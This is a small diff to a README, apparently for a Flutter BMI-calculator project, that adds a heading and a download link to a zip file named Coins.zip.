@@ -26,4 +26,8 @@
 <img src="https://user-images.githubusercontent.com/100410170/236028248-5ada0f75-a758-4b24-9d8c-717879cc141b.jpeg" width="200"> 
 </div>
 
+---
+## You can download the application by clicking on the link below 👇 
+[Coins](https://github.com/Zonetto/Flutter_calculating_bmi/files/12270364/Coins.zip)
+
 
